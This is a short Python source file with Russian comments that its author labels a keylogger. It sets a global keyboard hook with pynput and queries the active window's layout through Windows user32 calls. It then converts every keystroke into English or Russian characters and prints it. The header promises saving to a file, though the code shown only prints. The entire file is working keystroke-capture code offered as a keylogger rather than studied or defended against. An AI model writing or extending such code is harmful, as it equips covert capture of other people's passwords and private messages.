"""ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл"""
from pynput import keyboard
import ctypes

# издевательство, перевод с англ раскладки на РУ
dict_key_RU = {
    81: 'й', 87: 'ц', 69: 'у', 82: 'к', 84: 'е', 89: 'н', 85: 'г', 73: 'ш', 79: 'щ', 80: 'з',
    65: 'ф', 83: 'ы', 68: 'в', 70: 'а', 71: 'п', 72: 'р', 74: 'о', 75: 'л', 76: 'д', 186: 'ж',
    90: 'я', 88: 'ч', 67: 'с', 86: 'м', 66: 'и', 78: 'т', 77: 'ь', 188: 'б', 190: 'ю', 191: '.',
    219: 'х', 221: 'ъ', 192: 'ё', 220: '\\', 222: 'э'
}

# издевательство, перевод с ру раскладки на АНГЛ
dict_key_EN = {
    82: 'q', 88: 'w', 70: 'e', 83: 'r', 85: 't', 90: 'y', 86: 'u', 74: 'i', 80: 'o', 81: 'p',
    66: 'a', 84: 's', 69: 'd', 71: 'f', 72: 'g', 73: 'h', 75: 'j', 76: 'k', 77: 'l', 187: ';',
    91: 'z', 89: 'x', 68: 'c', 87: 'v', 67: 'b', 79: 'n', 78: 'm', 189: ',', 191: '.', 192: '/',
    220: '[', 222: ']', 193: '`', 221: '\\', 223: "'"
}


# словарь кодов ЯЗЫКОВ
dict_langs = {
    1033: "US",
    1049: "RU"
}


class LanguageQual:
    """КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ"""
    def keyboardLayout(self):
        """Функция получения нитей расклодок"""
        # хндл главного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # нить исполняемого данного окна ID
        nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # хндл нити. Этот хендл представляет код раскладки клавиатуры для данной нити.
        hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)

        lang_id = hndl_nit & 0xFFFF
        # print(lang_id)
        return lang_id


class KeyboardPrint(LanguageQual):
    """КЕЙЛОГЕР, КЛАСС СОЗДАНИЯ"""
    def on_press(self, key):
        """Фиксация нажатия клавиш и преобразование их в текст"""
        lang_id = self.keyboardLayout()  # получение id
        current_lang = dict_langs.get(lang_id, 'ERROR')  # находим по ключу ID языка в словаре
        # print(f'\nLANG - {current_lang}')

        try:
            if current_lang == 'US':
                key_EN = dict_key_EN.get(key.vk + 1, 'No key')  # смотрим, есть ли в АНГЛ словаре, ключ+1. Если да, ОК
                print(f'Press - {key_EN}')
            elif current_lang == 'RU':
                key_RU = dict_key_RU.get(key.vk, 'No key')  # анологично смотрим по ключам в РУ словаре, просто ключ
                print(f'Нажата - {key_RU}')  # , Ord Code = {key.vk}. KeyEN = {key}
        except AttributeError:
            print(f'Press2 - {key}') # если возникает ошибка, печатаем просто, обычно это просто шифты, пробелы и тд

    def key_print(self):
        """Обработчик клавиатуры, отслеживаем клавиатуру"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


k = KeyboardPrint()  # Создание экземпляра класса
print(k.key_print())  # Вызов метода у экземпляра




